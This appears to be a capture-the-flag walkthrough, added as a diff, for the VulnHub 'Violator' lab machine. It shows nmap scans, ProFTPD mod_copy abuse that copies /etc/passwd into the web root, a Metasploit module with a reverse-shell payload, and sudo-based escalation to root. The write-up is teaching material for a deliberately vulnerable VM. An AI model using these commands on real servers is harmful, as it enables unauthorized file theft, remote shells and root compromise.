@@ -1,1 +1,98 @@
 
+CTF Walkthrough: Violator
+Source: VulnHub - https://www.vulnhub.com/entry/violator-1,153/
+
+Setup Instructions
+Set the virtual machine in your NAT lab.
+
+1. Reconnaissance (Recon)
+Perform an Nmap scan to identify open ports.
+
+Command Examples:
+
+nmap -sV -v -Pn <host>  
+nmap -sC -A -p- -Pn <host>  
+
+Scan Results:
+
+PORT     STATE SERVICE      VERSION  
+21/tcp   open  ftp          ProFTPD (modecopy)     
+80/tcp   open  http         xxxx
+
+Service Info:  
+- Hosts: 
+- OS: Linux  
+  
+
+2. Enumeration
+FTP Enumeration (need user and password, use modecopy) 
+http (Has link about album)
+
+Exploiting ProFTPD
+ProFTPD allows file copy between directories. We need to find where the passwd is.
+
+File Transfer Example:
+Using netcat (nc) to connect to FTP:
+
+nc <host> 21  
+220 The Good Tech Inc. FTP Server  
+site cpfr /etc/passwd  (this case is locate this path)
+350 File or directory exists, ready for destination name  
+site cpto /var/www/html/passwd ( You can changed the mame passwd on the path var/www/html/*****)
+250 Copy successful  
+
+open it on browser: <host>/passwd
+download the file, you can see is saved users
+Exploiting ProFTPD
+ProFTPD allows file copy between directories. Use msfconsole to exploit it.
+
+Steps:
+Search for the ProFTPD exploit:
+bash
+Select and configure the exploit:
+bash
+
+use exploit/unix/ftp/proftpd_modcopy_exec  
+set RHOST <target IP>  
+set RPORT 21  
+set payload cmd/unix/reverse_python  
+exploit  
+
+After successful exploitation, escalate the shell:
+bash
+
+python -c "import pty; pty.spawn('/bin/bash')"  
+3. Privilege Escalation
+FTP Write Privilege Abuse
+Create a malicious file on your local machine:
+
+bash
+
+echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test  
+Upload the file to the FTP server:
+
+bash
+
+ftp <host>  
+put test  
+Use netcat to copy the file to a privileged directory:
+
+bash
+
+nc <host> 21  
+site cpfr /home/ftp/test  
+350 File or directory exists, ready for destination name  
+
+site cpto /home/patrick/script/test  
+250 Copy successful  
+Execute the file with elevated privileges:
+
+bash
+
+sudo /home/patrick/script/test  
+whoami  
+root  
+
+
+Conclusion
+You’ve successfully exploited the target, escalated privileges, and gained root access. Celebrate your achievement and document any additional findings.
